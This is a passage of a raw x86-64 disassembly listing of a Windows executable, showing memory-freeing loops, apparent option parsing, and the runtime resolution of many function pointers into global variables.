   140004bae:	0f 29 45 c0          	movaps %xmm0,-0x40(%rbp)
   140004bb2:	0f 29 4d d0          	movaps %xmm1,-0x30(%rbp)
   140004bb6:	ff 15 a4 68 02 00    	call   *0x268a4(%rip)        # 0x14002b460
   140004bbc:	85 c0                	test   %eax,%eax
   140004bbe:	0f 84 7b fd ff ff    	je     0x14000493f
   140004bc4:	4c 8d 5c 24 70       	lea    0x70(%rsp),%r11
   140004bc9:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140004bce:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   140004bd2:	49 8b 7b 18          	mov    0x18(%r11),%rdi
   140004bd6:	49 8b e3             	mov    %r11,%rsp
   140004bd9:	5d                   	pop    %rbp
   140004bda:	c3                   	ret
   140004bdb:	cc                   	int3
   140004bdc:	cc                   	int3
   140004bdd:	cc                   	int3
   140004bde:	cc                   	int3
   140004bdf:	cc                   	int3
   140004be0:	48 85 c9             	test   %rcx,%rcx
   140004be3:	0f 84 8f 00 00 00    	je     0x140004c78
   140004be9:	53                   	push   %rbx
   140004bea:	48 83 ec 20          	sub    $0x20,%rsp
   140004bee:	8b 41 1c             	mov    0x1c(%rcx),%eax
   140004bf1:	48 8b d9             	mov    %rcx,%rbx
   140004bf4:	48 89 7c 24 40       	mov    %rdi,0x40(%rsp)
   140004bf9:	33 ff                	xor    %edi,%edi
   140004bfb:	48 89 74 24 38       	mov    %rsi,0x38(%rsp)
   140004c00:	85 c0                	test   %eax,%eax
   140004c02:	74 29                	je     0x140004c2d
   140004c04:	8b f7                	mov    %edi,%esi
   140004c06:	7e 25                	jle    0x140004c2d
   140004c08:	48 89 6c 24 30       	mov    %rbp,0x30(%rsp)
   140004c0d:	8b ef                	mov    %edi,%ebp
   140004c0f:	90                   	nop
   140004c10:	48 8b 4b 20          	mov    0x20(%rbx),%rcx
   140004c14:	48 8b 0c 29          	mov    (%rcx,%rbp,1),%rcx
   140004c18:	e8 3f f5 00 00       	call   0x14001415c
   140004c1d:	ff c6                	inc    %esi
   140004c1f:	48 8d 6d 08          	lea    0x8(%rbp),%rbp
   140004c23:	3b 73 1c             	cmp    0x1c(%rbx),%esi
   140004c26:	7c e8                	jl     0x140004c10
   140004c28:	48 8b 6c 24 30       	mov    0x30(%rsp),%rbp
   140004c2d:	48 8b 4b 20          	mov    0x20(%rbx),%rcx
   140004c31:	e8 26 f5 00 00       	call   0x14001415c
   140004c36:	8b 43 28             	mov    0x28(%rbx),%eax
   140004c39:	85 c0                	test   %eax,%eax
   140004c3b:	7e 1b                	jle    0x140004c58
   140004c3d:	48 8b f7             	mov    %rdi,%rsi
   140004c40:	48 8b 4b 30          	mov    0x30(%rbx),%rcx
   140004c44:	48 8b 0c 31          	mov    (%rcx,%rsi,1),%rcx
   140004c48:	e8 0f f5 00 00       	call   0x14001415c
   140004c4d:	ff c7                	inc    %edi
   140004c4f:	48 8d 76 08          	lea    0x8(%rsi),%rsi
   140004c53:	3b 7b 28             	cmp    0x28(%rbx),%edi
   140004c56:	7c e8                	jl     0x140004c40
   140004c58:	48 8b 4b 30          	mov    0x30(%rbx),%rcx
   140004c5c:	e8 fb f4 00 00       	call   0x14001415c
   140004c61:	48 8b cb             	mov    %rbx,%rcx
   140004c64:	e8 f3 f4 00 00       	call   0x14001415c
   140004c69:	48 8b 7c 24 40       	mov    0x40(%rsp),%rdi
   140004c6e:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140004c73:	48 83 c4 20          	add    $0x20,%rsp
   140004c77:	5b                   	pop    %rbx
   140004c78:	c3                   	ret
   140004c79:	cc                   	int3
   140004c7a:	cc                   	int3
   140004c7b:	cc                   	int3
   140004c7c:	cc                   	int3
   140004c7d:	cc                   	int3
   140004c7e:	cc                   	int3
   140004c7f:	cc                   	int3
   140004c80:	40 53                	rex push %rbx
   140004c82:	55                   	push   %rbp
   140004c83:	41 55                	push   %r13
   140004c85:	41 56                	push   %r14
   140004c87:	41 57                	push   %r15
   140004c89:	48 83 ec 20          	sub    $0x20,%rsp
   140004c8d:	4c 8b b9 10 20 00 00 	mov    0x2010(%rcx),%r15
   140004c94:	45 33 ed             	xor    %r13d,%r13d
   140004c97:	b9 01 00 00 00       	mov    $0x1,%ecx
   140004c9c:	ba 38 00 00 00       	mov    $0x38,%edx
   140004ca1:	41 8b ed             	mov    %r13d,%ebp
   140004ca4:	45 8b f5             	mov    %r13d,%r14d
   140004ca7:	e8 a8 f4 00 00       	call   0x140014154
   140004cac:	48 8b d8             	mov    %rax,%rbx
   140004caf:	48 85 c0             	test   %rax,%rax
   140004cb2:	75 0d                	jne    0x140004cc1
   140004cb4:	48 83 c4 20          	add    $0x20,%rsp
   140004cb8:	41 5f                	pop    %r15
   140004cba:	41 5e                	pop    %r14
   140004cbc:	41 5d                	pop    %r13
   140004cbe:	5d                   	pop    %rbp
   140004cbf:	5b                   	pop    %rbx
   140004cc0:	c3                   	ret
   140004cc1:	48 89 74 24 50       	mov    %rsi,0x50(%rsp)
   140004cc6:	c7 40 14 ff ff ff ff 	movl   $0xffffffff,0x14(%rax)
   140004ccd:	49 8b b7 08 10 00 00 	mov    0x1008(%r15),%rsi
   140004cd4:	48 89 7c 24 58       	mov    %rdi,0x58(%rsp)
   140004cd9:	49 3b b7 10 10 00 00 	cmp    0x1010(%r15),%rsi
   140004ce0:	0f 83 73 01 00 00    	jae    0x140004e59
   140004ce6:	4c 89 64 24 60       	mov    %r12,0x60(%rsp)
   140004ceb:	4c 8d 25 c6 77 02 00 	lea    0x277c6(%rip),%r12        # 0x14002c4b8
   140004cf2:	80 7e 11 6f          	cmpb   $0x6f,0x11(%rsi)
   140004cf6:	0f 85 3d 01 00 00    	jne    0x140004e39
   140004cfc:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   140004d02:	48 8d 15 a7 77 02 00 	lea    0x277a7(%rip),%rdx        # 0x14002c4b0
   140004d09:	48 8d 4e 12          	lea    0x12(%rsi),%rcx
   140004d0d:	e8 4e f8 00 00       	call   0x140014560
   140004d12:	85 c0                	test   %eax,%eax
   140004d14:	0f 84 1f 01 00 00    	je     0x140004e39
   140004d1a:	80 7e 12 76          	cmpb   $0x76,0x12(%rsi)
   140004d1e:	75 06                	jne    0x140004d26
   140004d20:	44 38 6e 13          	cmp    %r13b,0x13(%rsi)
   140004d24:	74 1f                	je     0x140004d45
   140004d26:	49 8b cd             	mov    %r13,%rcx
   140004d29:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140004d30:	0f b6 44 0e 12       	movzbl 0x12(%rsi,%rcx,1),%eax
   140004d35:	48 ff c1             	inc    %rcx
   140004d38:	41 3a 44 0c ff       	cmp    -0x1(%r12,%rcx,1),%al
   140004d3d:	75 0d                	jne    0x140004d4c
   140004d3f:	48 83 f9 08          	cmp    $0x8,%rcx
   140004d43:	75 eb                	jne    0x140004d30
   140004d45:	ff 03                	incl   (%rbx)
   140004d47:	e9 ed 00 00 00       	jmp    0x140004e39
   140004d4c:	80 7e 12 75          	cmpb   $0x75,0x12(%rsi)
   140004d50:	75 0a                	jne    0x140004d5c
   140004d52:	44 38 6e 13          	cmp    %r13b,0x13(%rsi)
   140004d56:	0f 84 d6 00 00 00    	je     0x140004e32
   140004d5c:	48 8d 15 5d 77 02 00 	lea    0x2775d(%rip),%rdx        # 0x14002c4c0
   140004d63:	48 8d 4e 12          	lea    0x12(%rsi),%rcx
   140004d67:	e8 64 14 01 00       	call   0x1400161d0
   140004d6c:	85 c0                	test   %eax,%eax
   140004d6e:	0f 84 be 00 00 00    	je     0x140004e32
   140004d74:	80 7e 12 4f          	cmpb   $0x4f,0x12(%rsi)
   140004d78:	75 0a                	jne    0x140004d84
   140004d7a:	44 38 6e 13          	cmp    %r13b,0x13(%rsi)
   140004d7e:	0f 84 a9 00 00 00    	je     0x140004e2d
   140004d84:	48 8d 15 45 77 02 00 	lea    0x27745(%rip),%rdx        # 0x14002c4d0
   140004d8b:	48 8d 4e 12          	lea    0x12(%rsi),%rcx
   140004d8f:	e8 3c 14 01 00       	call   0x1400161d0
   140004d94:	85 c0                	test   %eax,%eax
   140004d96:	0f 84 91 00 00 00    	je     0x140004e2d
   140004d9c:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   140004da2:	48 8d 15 33 77 02 00 	lea    0x27733(%rip),%rdx        # 0x14002c4dc
   140004da9:	48 8d 4e 12          	lea    0x12(%rsi),%rcx
   140004dad:	e8 ae f7 00 00       	call   0x140014560
   140004db2:	85 c0                	test   %eax,%eax
   140004db4:	75 04                	jne    0x140004dba
   140004db6:	ff c5                	inc    %ebp
   140004db8:	eb 7f                	jmp    0x140004e39
   140004dba:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   140004dc0:	48 8d 15 19 77 02 00 	lea    0x27719(%rip),%rdx        # 0x14002c4e0
   140004dc7:	48 8d 4e 12          	lea    0x12(%rsi),%rcx
   140004dcb:	e8 90 f7 00 00       	call   0x140014560
   140004dd0:	85 c0                	test   %eax,%eax
   140004dd2:	75 05                	jne    0x140004dd9
   140004dd4:	41 ff c6             	inc    %r14d
   140004dd7:	eb 60                	jmp    0x140004e39
   140004dd9:	41 b8 09 00 00 00    	mov    $0x9,%r8d
   140004ddf:	48 8d 15 02 77 02 00 	lea    0x27702(%rip),%rdx        # 0x14002c4e8
   140004de6:	48 8d 4e 12          	lea    0x12(%rsi),%rcx
   140004dea:	e8 71 f7 00 00       	call   0x140014560
   140004def:	85 c0                	test   %eax,%eax
   140004df1:	75 46                	jne    0x140004e39
   140004df3:	0f b6 46 1b          	movzbl 0x1b(%rsi),%eax
   140004df7:	48 8d 4e 1b          	lea    0x1b(%rsi),%rcx
   140004dfb:	84 c0                	test   %al,%al
   140004dfd:	74 0b                	je     0x140004e0a
   140004dff:	3c 3d                	cmp    $0x3d,%al
   140004e01:	74 04                	je     0x140004e07
   140004e03:	3c 20                	cmp    $0x20,%al
   140004e05:	75 32                	jne    0x140004e39
   140004e07:	48 ff c1             	inc    %rcx
   140004e0a:	48 85 c9             	test   %rcx,%rcx
   140004e0d:	74 2a                	je     0x140004e39
   140004e0f:	44 38 29             	cmp    %r13b,(%rcx)
   140004e12:	74 25                	je     0x140004e39
   140004e14:	33 d2                	xor    %edx,%edx
   140004e16:	c7 43 0c 01 00 00 00 	movl   $0x1,0xc(%rbx)
   140004e1d:	41 b8 0a 00 00 00    	mov    $0xa,%r8d
   140004e23:	e8 8c 0f 01 00       	call   0x140015db4
   140004e28:	89 43 10             	mov    %eax,0x10(%rbx)
   140004e2b:	eb 0c                	jmp    0x140004e39
   140004e2d:	ff 43 08             	incl   0x8(%rbx)
   140004e30:	eb 07                	jmp    0x140004e39
   140004e32:	c7 43 04 01 00 00 00 	movl   $0x1,0x4(%rbx)
   140004e39:	48 8b d6             	mov    %rsi,%rdx
   140004e3c:	49 8b cf             	mov    %r15,%rcx
   140004e3f:	e8 9c ca ff ff       	call   0x1400018e0
   140004e44:	48 8b f0             	mov    %rax,%rsi
   140004e47:	49 3b 87 10 10 00 00 	cmp    0x1010(%r15),%rax
   140004e4e:	0f 82 9e fe ff ff    	jb     0x140004cf2
   140004e54:	4c 8b 64 24 60       	mov    0x60(%rsp),%r12
   140004e59:	48 63 cd             	movslq %ebp,%rcx
   140004e5c:	ba 08 00 00 00       	mov    $0x8,%edx
   140004e61:	e8 ee f2 00 00       	call   0x140014154
   140004e66:	49 63 ce             	movslq %r14d,%rcx
   140004e69:	ba 08 00 00 00       	mov    $0x8,%edx
   140004e6e:	48 89 43 20          	mov    %rax,0x20(%rbx)
   140004e72:	e8 dd f2 00 00       	call   0x140014154
   140004e77:	48 89 43 30          	mov    %rax,0x30(%rbx)
   140004e7b:	4c 39 6b 20          	cmp    %r13,0x20(%rbx)
   140004e7f:	0f 84 94 01 00 00    	je     0x140005019
   140004e85:	48 85 c0             	test   %rax,%rax
   140004e88:	0f 84 8b 01 00 00    	je     0x140005019
   140004e8e:	49 8b b7 08 10 00 00 	mov    0x1008(%r15),%rsi
   140004e95:	49 3b b7 10 10 00 00 	cmp    0x1010(%r15),%rsi
   140004e9c:	0f 83 ea 01 00 00    	jae    0x14000508c
   140004ea2:	bd 30 00 00 00       	mov    $0x30,%ebp
   140004ea7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   140004eae:	00 00 
   140004eb0:	80 7e 11 6f          	cmpb   $0x6f,0x11(%rsi)
   140004eb4:	0f 85 42 01 00 00    	jne    0x140004ffc
   140004eba:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   140004ec0:	48 8d 15 15 76 02 00 	lea    0x27615(%rip),%rdx        # 0x14002c4dc
   140004ec7:	48 8d 4e 12          	lea    0x12(%rsi),%rcx
   140004ecb:	e8 90 f6 00 00       	call   0x140014560
   140004ed0:	85 c0                	test   %eax,%eax
   140004ed2:	75 25                	jne    0x140004ef9
   140004ed4:	48 63 4b 1c          	movslq 0x1c(%rbx),%rcx
   140004ed8:	48 8b 43 20          	mov    0x20(%rbx),%rax
   140004edc:	48 8d 14 c8          	lea    (%rax,%rcx,8),%rdx
   140004ee0:	48 8d 4e 14          	lea    0x14(%rsi),%rcx
   140004ee4:	e8 97 f2 ff ff       	call   0x140004180
   140004ee9:	85 c0                	test   %eax,%eax
   140004eeb:	0f 88 28 01 00 00    	js     0x140005019
   140004ef1:	ff 43 1c             	incl   0x1c(%rbx)
   140004ef4:	e9 03 01 00 00       	jmp    0x140004ffc
   140004ef9:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   140004eff:	48 8d 15 da 75 02 00 	lea    0x275da(%rip),%rdx        # 0x14002c4e0
   140004f06:	48 8d 4e 12          	lea    0x12(%rsi),%rcx
   140004f0a:	e8 51 f6 00 00       	call   0x140014560
   140004f0f:	85 c0                	test   %eax,%eax
   140004f11:	0f 85 e5 00 00 00    	jne    0x140004ffc
   140004f17:	48 63 4b 28          	movslq 0x28(%rbx),%rcx
   140004f1b:	48 8b 43 30          	mov    0x30(%rbx),%rax
   140004f1f:	48 8d 14 c8          	lea    (%rax,%rcx,8),%rdx
   140004f23:	48 8d 4e 14          	lea    0x14(%rsi),%rcx
   140004f27:	e8 54 f2 ff ff       	call   0x140004180
   140004f2c:	85 c0                	test   %eax,%eax
   140004f2e:	0f 88 e5 00 00 00    	js     0x140005019
   140004f34:	ff 43 28             	incl   0x28(%rbx)
   140004f37:	48 8d 15 b6 75 02 00 	lea    0x275b6(%rip),%rdx        # 0x14002c4f4
   140004f3e:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   140004f44:	48 8d 4e 14          	lea    0x14(%rsi),%rcx
   140004f48:	e8 13 f6 00 00       	call   0x140014560
   140004f4d:	85 c0                	test   %eax,%eax
   140004f4f:	75 46                	jne    0x140004f97
   140004f51:	0f b6 46 18          	movzbl 0x18(%rsi),%eax
   140004f55:	48 8d 4e 18          	lea    0x18(%rsi),%rcx
   140004f59:	84 c0                	test   %al,%al
   140004f5b:	74 0b                	je     0x140004f68
   140004f5d:	3c 3d                	cmp    $0x3d,%al
   140004f5f:	74 04                	je     0x140004f65
   140004f61:	3c 20                	cmp    $0x20,%al
   140004f63:	75 32                	jne    0x140004f97
   140004f65:	48 ff c1             	inc    %rcx
   140004f68:	48 85 c9             	test   %rcx,%rcx
   140004f6b:	74 2a                	je     0x140004f97
   140004f6d:	44 38 29             	cmp    %r13b,(%rcx)
   140004f70:	75 09                	jne    0x140004f7b
   140004f72:	c7 43 14 01 00 00 00 	movl   $0x1,0x14(%rbx)
   140004f79:	eb 1c                	jmp    0x140004f97
   140004f7b:	0f b6 11             	movzbl (%rcx),%edx
   140004f7e:	2b d5                	sub    %ebp,%edx
   140004f80:	75 0a                	jne    0x140004f8c
   140004f82:	0f b6 51 01          	movzbl 0x1(%rcx),%edx
   140004f86:	41 0f b6 c5          	movzbl %r13b,%eax
   140004f8a:	2b d0                	sub    %eax,%edx
   140004f8c:	41 8b c5             	mov    %r13d,%eax
   140004f8f:	85 d2                	test   %edx,%edx
   140004f91:	0f 95 c0             	setne  %al
   140004f94:	89 43 14             	mov    %eax,0x14(%rbx)
   140004f97:	41 b8 03 00 00 00    	mov    $0x3,%r8d
   140004f9d:	48 8d 15 58 75 02 00 	lea    0x27558(%rip),%rdx        # 0x14002c4fc
   140004fa4:	48 8d 4e 14          	lea    0x14(%rsi),%rcx
   140004fa8:	e8 b3 f5 00 00       	call   0x140014560
   140004fad:	85 c0                	test   %eax,%eax
   140004faf:	75 4b                	jne    0x140004ffc
   140004fb1:	0f b6 46 17          	movzbl 0x17(%rsi),%eax
   140004fb5:	48 8d 4e 17          	lea    0x17(%rsi),%rcx
   140004fb9:	84 c0                	test   %al,%al
   140004fbb:	74 0b                	je     0x140004fc8
   140004fbd:	3c 3d                	cmp    $0x3d,%al
   140004fbf:	74 04                	je     0x140004fc5
   140004fc1:	3c 20                	cmp    $0x20,%al
   140004fc3:	75 37                	jne    0x140004ffc
   140004fc5:	48 ff c1             	inc    %rcx
   140004fc8:	48 85 c9             	test   %rcx,%rcx
   140004fcb:	74 2f                	je     0x140004ffc
   140004fcd:	44 38 29             	cmp    %r13b,(%rcx)
   140004fd0:	75 09                	jne    0x140004fdb
   140004fd2:	c7 43 18 01 00 00 00 	movl   $0x1,0x18(%rbx)
   140004fd9:	eb 21                	jmp    0x140004ffc
   140004fdb:	44 0f b6 01          	movzbl (%rcx),%r8d
   140004fdf:	44 2b c5             	sub    %ebp,%r8d
   140004fe2:	75 0c                	jne    0x140004ff0
   140004fe4:	44 0f b6 41 01       	movzbl 0x1(%rcx),%r8d
   140004fe9:	41 0f b6 c5          	movzbl %r13b,%eax
   140004fed:	44 2b c0             	sub    %eax,%r8d
   140004ff0:	41 8b c5             	mov    %r13d,%eax
   140004ff3:	45 85 c0             	test   %r8d,%r8d
   140004ff6:	0f 95 c0             	setne  %al
   140004ff9:	89 43 18             	mov    %eax,0x18(%rbx)
   140004ffc:	48 8b d6             	mov    %rsi,%rdx
   140004fff:	49 8b cf             	mov    %r15,%rcx
   140005002:	e8 d9 c8 ff ff       	call   0x1400018e0
   140005007:	48 8b f0             	mov    %rax,%rsi
   14000500a:	49 3b 87 10 10 00 00 	cmp    0x1010(%r15),%rax
   140005011:	0f 82 99 fe ff ff    	jb     0x140004eb0
   140005017:	eb 73                	jmp    0x14000508c
   140005019:	8b 43 1c             	mov    0x1c(%rbx),%eax
   14000501c:	85 c0                	test   %eax,%eax
   14000501e:	74 28                	je     0x140005048
   140005020:	41 8b f5             	mov    %r13d,%esi
   140005023:	7e 23                	jle    0x140005048
   140005025:	49 8b fd             	mov    %r13,%rdi
   140005028:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000502f:	00 
   140005030:	48 8b 4b 20          	mov    0x20(%rbx),%rcx
   140005034:	48 8b 0c 0f          	mov    (%rdi,%rcx,1),%rcx
   140005038:	e8 1f f1 00 00       	call   0x14001415c
   14000503d:	ff c6                	inc    %esi
   14000503f:	48 8d 7f 08          	lea    0x8(%rdi),%rdi
   140005043:	3b 73 1c             	cmp    0x1c(%rbx),%esi
   140005046:	7c e8                	jl     0x140005030
   140005048:	48 8b 4b 20          	mov    0x20(%rbx),%rcx
   14000504c:	e8 0b f1 00 00       	call   0x14001415c
   140005051:	8b 43 28             	mov    0x28(%rbx),%eax
   140005054:	85 c0                	test   %eax,%eax
   140005056:	74 20                	je     0x140005078
   140005058:	41 8b f5             	mov    %r13d,%esi
   14000505b:	7e 1b                	jle    0x140005078
   14000505d:	49 8b fd             	mov    %r13,%rdi
   140005060:	48 8b 4b 30          	mov    0x30(%rbx),%rcx
   140005064:	48 8b 0c 0f          	mov    (%rdi,%rcx,1),%rcx
   140005068:	e8 ef f0 00 00       	call   0x14001415c
   14000506d:	ff c6                	inc    %esi
   14000506f:	48 8d 7f 08          	lea    0x8(%rdi),%rdi
   140005073:	3b 73 28             	cmp    0x28(%rbx),%esi
   140005076:	7c e8                	jl     0x140005060
   140005078:	48 8b 4b 30          	mov    0x30(%rbx),%rcx
   14000507c:	e8 db f0 00 00       	call   0x14001415c
   140005081:	48 8b cb             	mov    %rbx,%rcx
   140005084:	e8 d3 f0 00 00       	call   0x14001415c
   140005089:	49 8b dd             	mov    %r13,%rbx
   14000508c:	48 8b 7c 24 58       	mov    0x58(%rsp),%rdi
   140005091:	48 8b c3             	mov    %rbx,%rax
   140005094:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   140005099:	48 83 c4 20          	add    $0x20,%rsp
   14000509d:	41 5f                	pop    %r15
   14000509f:	41 5e                	pop    %r14
   1400050a1:	41 5d                	pop    %r13
   1400050a3:	5d                   	pop    %rbp
   1400050a4:	5b                   	pop    %rbx
   1400050a5:	c3                   	ret
   1400050a6:	cc                   	int3
   1400050a7:	cc                   	int3
   1400050a8:	cc                   	int3
   1400050a9:	cc                   	int3
   1400050aa:	cc                   	int3
   1400050ab:	cc                   	int3
   1400050ac:	cc                   	int3
   1400050ad:	cc                   	int3
   1400050ae:	cc                   	int3
   1400050af:	cc                   	int3
   1400050b0:	40 53                	rex push %rbx
   1400050b2:	48 83 ec 20          	sub    $0x20,%rsp
   1400050b6:	48 8d 15 6b 74 02 00 	lea    0x2746b(%rip),%rdx        # 0x14002c528
   1400050bd:	48 8b d9             	mov    %rcx,%rbx
   1400050c0:	ff 15 12 60 02 00    	call   *0x26012(%rip)        # 0x14002b0d8
   1400050c6:	48 89 05 9b ec 03 00 	mov    %rax,0x3ec9b(%rip)        # 0x140043d68
   1400050cd:	48 85 c0             	test   %rax,%rax
   1400050d0:	75 25                	jne    0x1400050f7
   1400050d2:	4c 8d 05 4f 74 02 00 	lea    0x2744f(%rip),%r8        # 0x14002c528
   1400050d9:	48 8d 15 58 74 02 00 	lea    0x27458(%rip),%rdx        # 0x14002c538
   1400050e0:	48 8d 0d 91 74 02 00 	lea    0x27491(%rip),%rcx        # 0x14002c578
   1400050e7:	e8 f4 d8 ff ff       	call   0x1400029e0
   1400050ec:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   1400050f1:	48 83 c4 20          	add    $0x20,%rsp
   1400050f5:	5b                   	pop    %rbx
   1400050f6:	c3                   	ret
   1400050f7:	48 8d 15 9a 74 02 00 	lea    0x2749a(%rip),%rdx        # 0x14002c598
   1400050fe:	48 8b cb             	mov    %rbx,%rcx
   140005101:	ff 15 d1 5f 02 00    	call   *0x25fd1(%rip)        # 0x14002b0d8
   140005107:	48 89 05 62 ec 03 00 	mov    %rax,0x3ec62(%rip)        # 0x140043d70
   14000510e:	48 85 c0             	test   %rax,%rax
   140005111:	75 09                	jne    0x14000511c
   140005113:	4c 8d 05 7e 74 02 00 	lea    0x2747e(%rip),%r8        # 0x14002c598
   14000511a:	eb bd                	jmp    0x1400050d9
   14000511c:	48 8d 15 85 74 02 00 	lea    0x27485(%rip),%rdx        # 0x14002c5a8
   140005123:	48 8b cb             	mov    %rbx,%rcx
   140005126:	ff 15 ac 5f 02 00    	call   *0x25fac(%rip)        # 0x14002b0d8
   14000512c:	48 89 05 45 ec 03 00 	mov    %rax,0x3ec45(%rip)        # 0x140043d78
   140005133:	48 85 c0             	test   %rax,%rax
   140005136:	75 09                	jne    0x140005141
   140005138:	4c 8d 05 69 74 02 00 	lea    0x27469(%rip),%r8        # 0x14002c5a8
   14000513f:	eb 98                	jmp    0x1400050d9
   140005141:	48 8d 15 78 74 02 00 	lea    0x27478(%rip),%rdx        # 0x14002c5c0
   140005148:	48 8b cb             	mov    %rbx,%rcx
   14000514b:	ff 15 87 5f 02 00    	call   *0x25f87(%rip)        # 0x14002b0d8
   140005151:	48 89 05 28 ec 03 00 	mov    %rax,0x3ec28(%rip)        # 0x140043d80
   140005158:	48 85 c0             	test   %rax,%rax
   14000515b:	75 0c                	jne    0x140005169
   14000515d:	4c 8d 05 5c 74 02 00 	lea    0x2745c(%rip),%r8        # 0x14002c5c0
   140005164:	e9 70 ff ff ff       	jmp    0x1400050d9
   140005169:	48 8d 15 60 74 02 00 	lea    0x27460(%rip),%rdx        # 0x14002c5d0
   140005170:	48 8b cb             	mov    %rbx,%rcx
   140005173:	ff 15 5f 5f 02 00    	call   *0x25f5f(%rip)        # 0x14002b0d8
   140005179:	48 89 05 08 ec 03 00 	mov    %rax,0x3ec08(%rip)        # 0x140043d88
   140005180:	48 85 c0             	test   %rax,%rax
   140005183:	75 0c                	jne    0x140005191
   140005185:	4c 8d 05 44 74 02 00 	lea    0x27444(%rip),%r8        # 0x14002c5d0
   14000518c:	e9 48 ff ff ff       	jmp    0x1400050d9
   140005191:	48 8d 15 50 74 02 00 	lea    0x27450(%rip),%rdx        # 0x14002c5e8
   140005198:	48 8b cb             	mov    %rbx,%rcx
   14000519b:	ff 15 37 5f 02 00    	call   *0x25f37(%rip)        # 0x14002b0d8
   1400051a1:	48 89 05 e8 eb 03 00 	mov    %rax,0x3ebe8(%rip)        # 0x140043d90
   1400051a8:	48 85 c0             	test   %rax,%rax
   1400051ab:	75 0c                	jne    0x1400051b9
   1400051ad:	4c 8d 05 34 74 02 00 	lea    0x27434(%rip),%r8        # 0x14002c5e8
   1400051b4:	e9 20 ff ff ff       	jmp    0x1400050d9
   1400051b9:	48 8d 15 40 74 02 00 	lea    0x27440(%rip),%rdx        # 0x14002c600
   1400051c0:	48 8b cb             	mov    %rbx,%rcx
   1400051c3:	ff 15 0f 5f 02 00    	call   *0x25f0f(%rip)        # 0x14002b0d8
   1400051c9:	48 89 05 c8 eb 03 00 	mov    %rax,0x3ebc8(%rip)        # 0x140043d98
   1400051d0:	48 85 c0             	test   %rax,%rax
   1400051d3:	75 0c                	jne    0x1400051e1
   1400051d5:	4c 8d 05 24 74 02 00 	lea    0x27424(%rip),%r8        # 0x14002c600
   1400051dc:	e9 f8 fe ff ff       	jmp    0x1400050d9
   1400051e1:	48 8d 15 30 74 02 00 	lea    0x27430(%rip),%rdx        # 0x14002c618
   1400051e8:	48 8b cb             	mov    %rbx,%rcx
   1400051eb:	ff 15 e7 5e 02 00    	call   *0x25ee7(%rip)        # 0x14002b0d8
   1400051f1:	48 89 05 a8 eb 03 00 	mov    %rax,0x3eba8(%rip)        # 0x140043da0
   1400051f8:	48 85 c0             	test   %rax,%rax
   1400051fb:	75 0c                	jne    0x140005209
   1400051fd:	4c 8d 05 14 74 02 00 	lea    0x27414(%rip),%r8        # 0x14002c618
   140005204:	e9 d0 fe ff ff       	jmp    0x1400050d9
   140005209:	48 8d 15 18 74 02 00 	lea    0x27418(%rip),%rdx        # 0x14002c628
   140005210:	48 8b cb             	mov    %rbx,%rcx
   140005213:	ff 15 bf 5e 02 00    	call   *0x25ebf(%rip)        # 0x14002b0d8
   140005219:	48 89 05 88 eb 03 00 	mov    %rax,0x3eb88(%rip)        # 0x140043da8
   140005220:	48 85 c0             	test   %rax,%rax
   140005223:	75 0c                	jne    0x140005231
   140005225:	4c 8d 05 fc 73 02 00 	lea    0x273fc(%rip),%r8        # 0x14002c628
   14000522c:	e9 a8 fe ff ff       	jmp    0x1400050d9
   140005231:	48 8d 15 10 74 02 00 	lea    0x27410(%rip),%rdx        # 0x14002c648
   140005238:	48 8b cb             	mov    %rbx,%rcx
   14000523b:	ff 15 97 5e 02 00    	call   *0x25e97(%rip)        # 0x14002b0d8
   140005241:	48 89 05 68 eb 03 00 	mov    %rax,0x3eb68(%rip)        # 0x140043db0
   140005248:	48 85 c0             	test   %rax,%rax
   14000524b:	75 0c                	jne    0x140005259
   14000524d:	4c 8d 05 f4 73 02 00 	lea    0x273f4(%rip),%r8        # 0x14002c648
   140005254:	e9 80 fe ff ff       	jmp    0x1400050d9
   140005259:	48 8d 15 f8 73 02 00 	lea    0x273f8(%rip),%rdx        # 0x14002c658
   140005260:	48 8b cb             	mov    %rbx,%rcx
   140005263:	ff 15 6f 5e 02 00    	call   *0x25e6f(%rip)        # 0x14002b0d8
   140005269:	48 89 05 48 eb 03 00 	mov    %rax,0x3eb48(%rip)        # 0x140043db8
   140005270:	48 85 c0             	test   %rax,%rax
   140005273:	75 0c                	jne    0x140005281
   140005275:	4c 8d 05 dc 73 02 00 	lea    0x273dc(%rip),%r8        # 0x14002c658
   14000527c:	e9 58 fe ff ff       	jmp    0x1400050d9
   140005281:	48 8d 15 e8 73 02 00 	lea    0x273e8(%rip),%rdx        # 0x14002c670
   140005288:	48 8b cb             	mov    %rbx,%rcx
   14000528b:	ff 15 47 5e 02 00    	call   *0x25e47(%rip)        # 0x14002b0d8
   140005291:	48 89 05 28 eb 03 00 	mov    %rax,0x3eb28(%rip)        # 0x140043dc0
   140005298:	48 85 c0             	test   %rax,%rax
   14000529b:	75 0c                	jne    0x1400052a9
   14000529d:	4c 8d 05 cc 73 02 00 	lea    0x273cc(%rip),%r8        # 0x14002c670
   1400052a4:	e9 30 fe ff ff       	jmp    0x1400050d9
   1400052a9:	48 8d 15 d8 73 02 00 	lea    0x273d8(%rip),%rdx        # 0x14002c688
   1400052b0:	48 8b cb             	mov    %rbx,%rcx
   1400052b3:	ff 15 1f 5e 02 00    	call   *0x25e1f(%rip)        # 0x14002b0d8
   1400052b9:	48 89 05 08 eb 03 00 	mov    %rax,0x3eb08(%rip)        # 0x140043dc8
   1400052c0:	48 85 c0             	test   %rax,%rax
   1400052c3:	75 0c                	jne    0x1400052d1
   1400052c5:	4c 8d 05 bc 73 02 00 	lea    0x273bc(%rip),%r8        # 0x14002c688
   1400052cc:	e9 08 fe ff ff       	jmp    0x1400050d9
   1400052d1:	48 8d 15 d0 73 02 00 	lea    0x273d0(%rip),%rdx        # 0x14002c6a8
   1400052d8:	48 8b cb             	mov    %rbx,%rcx
